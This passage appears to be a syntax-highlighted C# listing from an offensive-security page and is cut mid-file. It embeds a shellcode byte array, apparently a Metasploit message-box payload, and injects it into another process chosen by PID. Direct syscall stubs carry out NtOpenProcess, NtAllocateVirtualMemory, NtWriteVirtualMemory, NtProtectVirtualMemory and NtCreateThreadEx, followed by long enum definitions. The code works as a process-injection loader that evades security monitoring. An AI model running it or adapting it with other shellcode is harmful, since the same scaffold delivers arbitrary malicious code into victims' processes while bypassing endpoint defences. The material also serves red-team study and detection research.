</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">readonly</span> <span style="color:#66d9ef">byte</span>[] _shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
            <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,
            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xd2,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x60,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x0f,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x02,
            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xe2,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x3e,
            <span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x88,
            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x74,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>x5c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x3e,
            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x41,
            <span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x03,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x24,
            <span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x24,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,
            <span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x0c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x1c,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,
            <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x5e,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x41,
            <span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xec,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,
            <span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>xe9,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>x5d,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xc7,<span style="color:#ae81ff">0</span>xc1,
            <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8d,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x1a,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x8d,
            <span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>x2b,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x07,<span style="color:#ae81ff">0</span>xff,
            <span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x1d,<span style="color:#ae81ff">0</span>x2a,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>xbd,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,
            <span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xc4,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x06,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>xfb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>x05,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>x47,<span style="color:#ae81ff">0</span>x13,
            <span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6a,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6f,
            <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6d,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x53,<span style="color:#ae81ff">0</span>x46,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x73,
            <span style="color:#ae81ff">0</span>x73,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x67,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x78,<span style="color:#ae81ff">0</span>x00 };

    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
    {
        <span style="color:#75715e">// NtOpenProcess
</span><span style="color:#75715e"></span>        IntPtr stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
        NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));

        IntPtr hProcess = IntPtr.Zero;
        OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();

        CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
        {
            UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
        };

        NTSTATUS result = ntOpenProcess(
            <span style="color:#66d9ef">ref</span> hProcess,
            <span style="color:#ae81ff">0</span>x001F0FFF,
            <span style="color:#66d9ef">ref</span> oa,
            <span style="color:#66d9ef">ref</span> ci);

        <span style="color:#75715e">// NtAllocateVirtualMemory
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtAllocateVirtualMemory&#34;</span>);
        NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtAllocateVirtualMemory));

        IntPtr baseAddress = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)_shellcode.Length;

        result = ntAllocateVirtualMemory(
            hProcess,
            <span style="color:#66d9ef">ref</span> baseAddress,
            IntPtr.Zero,
            <span style="color:#66d9ef">ref</span> regionSize,
            <span style="color:#ae81ff">0</span>x1000 | <span style="color:#ae81ff">0</span>x2000,
            <span style="color:#ae81ff">0</span>x04);

        <span style="color:#75715e">// NtWriteVirtualMemory
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtWriteVirtualMemory&#34;</span>);
        NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtWriteVirtualMemory));

        <span style="color:#66d9ef">var</span> buffer = Marshal.AllocHGlobal(_shellcode.Length);
        Marshal.Copy(_shellcode, <span style="color:#ae81ff">0</span>, buffer, _shellcode.Length);

        <span style="color:#66d9ef">uint</span> bytesWritten = <span style="color:#ae81ff">0</span>;

        result = ntWriteVirtualMemory(
            hProcess,
            baseAddress,
            buffer,
            (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
            <span style="color:#66d9ef">ref</span> bytesWritten);

        <span style="color:#75715e">// NtProtectVirtualMemory
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtProtectVirtualMemory&#34;</span>);
        NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtProtectVirtualMemory));

        <span style="color:#66d9ef">uint</span> oldProtect = <span style="color:#ae81ff">0</span>;

        result = ntProtectVirtualMemory(
            hProcess,
            <span style="color:#66d9ef">ref</span> baseAddress,
            <span style="color:#66d9ef">ref</span> regionSize,
            <span style="color:#ae81ff">0</span>x20,
            <span style="color:#66d9ef">ref</span> oldProtect);

        <span style="color:#75715e">// NtCreateThreadEx
</span><span style="color:#75715e"></span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtCreateThreadEx&#34;</span>);
        NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtCreateThreadEx));

        IntPtr hThread = IntPtr.Zero;

        result = ntCreateThreadEx(
            <span style="color:#66d9ef">out</span> hThread,
            ACCESS_MASK.MAXIMUM_ALLOWED,
            IntPtr.Zero,
            hProcess,
            baseAddress,
            IntPtr.Zero,
            <span style="color:#66d9ef">false</span>,
            <span style="color:#ae81ff">0</span>,
            <span style="color:#ae81ff">0</span>,
            <span style="color:#ae81ff">0</span>,
            IntPtr.Zero);
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
            <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
            <span style="color:#66d9ef">uint</span> DesiredAccess,
            <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
            <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
            IntPtr ZeroBits,
            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
            <span style="color:#66d9ef">uint</span> AllocationType,
            <span style="color:#66d9ef">uint</span> Protect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            <span style="color:#66d9ef">uint</span> BufferLength,
            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> BytesWritten);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
            <span style="color:#66d9ef">uint</span> NewProtect,
            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> OldProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
        <span style="color:#66d9ef">delegate</span> NTSTATUS NtCreateThreadEx(
            <span style="color:#66d9ef">out</span> IntPtr threadHandle,
            ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            <span style="color:#66d9ef">bool</span> createSuspended,
            <span style="color:#66d9ef">int</span> stackZeroBits,
            <span style="color:#66d9ef">int</span> sizeOfStack,
            <span style="color:#66d9ef">int</span> maximumStackSize,
            IntPtr attributeList);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
        {
            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
            <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
            <span style="color:#66d9ef">public</span> IntPtr ObjectName;
            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
            <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
            <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
        {
            <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
            <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [Flags]</span>
        <span style="color:#66d9ef">enum</span> ACCESS_MASK : <span style="color:#66d9ef">uint</span>
        {
            DELETE = <span style="color:#ae81ff">0</span>x00010000,
            READ_CONTROL = <span style="color:#ae81ff">0</span>x00020000,
            WRITE_DAC = <span style="color:#ae81ff">0</span>x00040000,
            WRITE_OWNER = <span style="color:#ae81ff">0</span>x00080000,
            SYNCHRONIZE = <span style="color:#ae81ff">0</span>x00100000,
            STANDARD_RIGHTS_REQUIRED = <span style="color:#ae81ff">0</span>x000F0000,
            STANDARD_RIGHTS_READ = <span style="color:#ae81ff">0</span>x00020000,
            STANDARD_RIGHTS_WRITE = <span style="color:#ae81ff">0</span>x00020000,
            STANDARD_RIGHTS_EXECUTE = <span style="color:#ae81ff">0</span>x00020000,
            STANDARD_RIGHTS_ALL = <span style="color:#ae81ff">0</span>x001F0000,
            SPECIFIC_RIGHTS_ALL = <span style="color:#ae81ff">0</span>x0000FFF,
            ACCESS_SYSTEM_SECURITY = <span style="color:#ae81ff">0</span>x01000000,
            MAXIMUM_ALLOWED = <span style="color:#ae81ff">0</span>x02000000,
            GENERIC_READ = <span style="color:#ae81ff">0</span>x80000000,
            GENERIC_WRITE = <span style="color:#ae81ff">0</span>x40000000,
            GENERIC_EXECUTE = <span style="color:#ae81ff">0</span>x20000000,
            GENERIC_ALL = <span style="color:#ae81ff">0</span>x10000000,
            DESKTOP_READOBJECTS = <span style="color:#ae81ff">0</span>x00000001,
            DESKTOP_CREATEWINDOW = <span style="color:#ae81ff">0</span>x00000002,
            DESKTOP_CREATEMENU = <span style="color:#ae81ff">0</span>x00000004,
            DESKTOP_HOOKCONTROL = <span style="color:#ae81ff">0</span>x00000008,
            DESKTOP_JOURNALRECORD = <span style="color:#ae81ff">0</span>x00000010,
            DESKTOP_JOURNALPLAYBACK = <span style="color:#ae81ff">0</span>x00000020,
            DESKTOP_ENUMERATE = <span style="color:#ae81ff">0</span>x00000040,
            DESKTOP_WRITEOBJECTS = <span style="color:#ae81ff">0</span>x00000080,
            DESKTOP_SWITCHDESKTOP = <span style="color:#ae81ff">0</span>x00000100,
            WINSTA_ENUMDESKTOPS = <span style="color:#ae81ff">0</span>x00000001,
            WINSTA_READATTRIBUTES = <span style="color:#ae81ff">0</span>x00000002,
            WINSTA_ACCESSCLIPBOARD = <span style="color:#ae81ff">0</span>x00000004,
            WINSTA_CREATEDESKTOP = <span style="color:#ae81ff">0</span>x00000008,
            WINSTA_WRITEATTRIBUTES = <span style="color:#ae81ff">0</span>x00000010,
            WINSTA_ACCESSGLOBALATOMS = <span style="color:#ae81ff">0</span>x00000020,
            WINSTA_EXITWINDOWS = <span style="color:#ae81ff">0</span>x00000040,
            WINSTA_ENUMERATE = <span style="color:#ae81ff">0</span>x00000100,
            WINSTA_READSCREEN = <span style="color:#ae81ff">0</span>x00000200,
            WINSTA_ALL_ACCESS = <span style="color:#ae81ff">0</span>x0000037F,

            SECTION_ALL_ACCESS = <span style="color:#ae81ff">0</span>x10000000,
            SECTION_QUERY = <span style="color:#ae81ff">0</span>x0001,
            SECTION_MAP_WRITE = <span style="color:#ae81ff">0</span>x0002,
            SECTION_MAP_READ = <span style="color:#ae81ff">0</span>x0004,
            SECTION_MAP_EXECUTE = <span style="color:#ae81ff">0</span>x0008,
            SECTION_EXTEND_SIZE = <span style="color:#ae81ff">0</span>x0010
        };
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [Flags]</span>
        <span style="color:#66d9ef">enum</span> NTSTATUS : <span style="color:#66d9ef">uint</span>
        {
            <span style="color:#75715e">// Success
</span><span style="color:#75715e"></span>            Success = <span style="color:#ae81ff">0</span>x00000000,
            Wait0 = <span style="color:#ae81ff">0</span>x00000000,
            Wait1 = <span style="color:#ae81ff">0</span>x00000001,
            Wait2 = <span style="color:#ae81ff">0</span>x00000002,
            Wait3 = <span style="color:#ae81ff">0</span>x00000003,
            Wait63 = <span style="color:#ae81ff">0</span>x0000003f,
            Abandoned = <span style="color:#ae81ff">0</span>x00000080,
            AbandonedWait0 = <span style="color:#ae81ff">0</span>x00000080,
            AbandonedWait1 = <span style="color:#ae81ff">0</span>x00000081,
            AbandonedWait2 = <span style="color:#ae81ff">0</span>x00000082,
            AbandonedWait3 = <span style="color:#ae81ff">0</span>x00000083,
            AbandonedWait63 = <span style="color:#ae81ff">0</span>x000000bf,
            UserApc = <span style="color:#ae81ff">0</span>x000000c0,
            KernelApc = <span style="color:#ae81ff">0</span>x00000100,
            Alerted = <span style="color:#ae81ff">0</span>x00000101,
            Timeout = <span style="color:#ae81ff">0</span>x00000102,
            Pending = <span style="color:#ae81ff">0</span>x00000103,
            Reparse = <span style="color:#ae81ff">0</span>x00000104,
            MoreEntries = <span style="color:#ae81ff">0</span>x00000105,
            NotAllAssigned = <span style="color:#ae81ff">0</span>x00000106,
            SomeNotMapped = <span style="color:#ae81ff">0</span>x00000107,
            OpLockBreakInProgress = <span style="color:#ae81ff">0</span>x00000108,
            VolumeMounted = <span style="color:#ae81ff">0</span>x00000109,
            RxActCommitted = <span style="color:#ae81ff">0</span>x0000010a,
            NotifyCleanup = <span style="color:#ae81ff">0</span>x0000010b,
            NotifyEnumDir = <span style="color:#ae81ff">0</span>x0000010c,
            NoQuotasForAccount = <span style="color:#ae81ff">0</span>x0000010d,
            PrimaryTransportConnectFailed = <span style="color:#ae81ff">0</span>x0000010e,
            PageFaultTransition = <span style="color:#ae81ff">0</span>x00000110,
            PageFaultDemandZero = <span style="color:#ae81ff">0</span>x00000111,
            PageFaultCopyOnWrite = <span style="color:#ae81ff">0</span>x00000112,
            PageFaultGuardPage = <span style="color:#ae81ff">0</span>x00000113,
            PageFaultPagingFile = <span style="color:#ae81ff">0</span>x00000114,
            CrashDump = <span style="color:#ae81ff">0</span>x00000116,
            ReparseObject = <span style="color:#ae81ff">0</span>x00000118,
            NothingToTerminate = <span style="color:#ae81ff">0</span>x00000122,
            ProcessNotInJob = <span style="color:#ae81ff">0</span>x00000123,
            ProcessInJob = <span style="color:#ae81ff">0</span>x00000124,
            ProcessCloned = <span style="color:#ae81ff">0</span>x00000129,
            FileLockedWithOnlyReaders = <span style="color:#ae81ff">0</span>x0000012a,
            FileLockedWithWriters = <span style="color:#ae81ff">0</span>x0000012b,

            <span style="color:#75715e">// Informational
</span><span style="color:#75715e"></span>            Informational = <span style="color:#ae81ff">0</span>x40000000,
            ObjectNameExists = <span style="color:#ae81ff">0</span>x40000000,
            ThreadWasSuspended = <span style="color:#ae81ff">0</span>x40000001,
            WorkingSetLimitRange = <span style="color:#ae81ff">0</span>x40000002,
            ImageNotAtBase = <span style="color:#ae81ff">0</span>x40000003,
            RegistryRecovered = <span style="color:#ae81ff">0</span>x40000009,

            <span style="color:#75715e">// Warning
</span><span style="color:#75715e"></span>            Warning = <span style="color:#ae81ff">0</span>x80000000,
            GuardPageViolation = <span style="color:#ae81ff">0</span>x80000001,
            DatatypeMisalignment = <span style="color:#ae81ff">0</span>x80000002,
            Breakpoint = <span style="color:#ae81ff">0</span>x80000003,
            SingleStep = <span style="color:#ae81ff">0</span>x80000004,
            BufferOverflow = <span style="color:#ae81ff">0</span>x80000005,
            NoMoreFiles = <span style="color:#ae81ff">0</span>x80000006,
            HandlesClosed = <span style="color:#ae81ff">0</span>x8000000a,
            PartialCopy = <span style="color:#ae81ff">0</span>x8000000d,
            DeviceBusy = <span style="color:#ae81ff">0</span>x80000011,
            InvalidEaName = <span style="color:#ae81ff">0</span>x80000013,
            EaListInconsistent = <span style="color:#ae81ff">0</span>x80000014,
            NoMoreEntries = <span style="color:#ae81ff">0</span>x8000001a,
            LongJump = <span style="color:#ae81ff">0</span>x80000026,
            DllMightBeInsecure = <span style="color:#ae81ff">0</span>x8000002b,

            <span style="color:#75715e">// Error
</span><span style="color:#75715e"></span>            Error = <span style="color:#ae81ff">0</span>xc0000000,
            Unsuccessful = <span style="color:#ae81ff">0</span>xc0000001,
            NotImplemented = <span style="color:#ae81ff">0</span>xc0000002,
            InvalidInfoClass = <span style="color:#ae81ff">0</span>xc0000003,
            InfoLengthMismatch = <span style="color:#ae81ff">0</span>xc0000004,
            AccessViolation = <span style="color:#ae81ff">0</span>xc0000005,
            InPageError = <span style="color:#ae81ff">0</span>xc0000006,
            PagefileQuota = <span style="color:#ae81ff">0</span>xc0000007,
            InvalidHandle = <span style="color:#ae81ff">0</span>xc0000008,
            BadInitialStack = <span style="color:#ae81ff">0</span>xc0000009,
            BadInitialPc = <span style="color:#ae81ff">0</span>xc000000a,
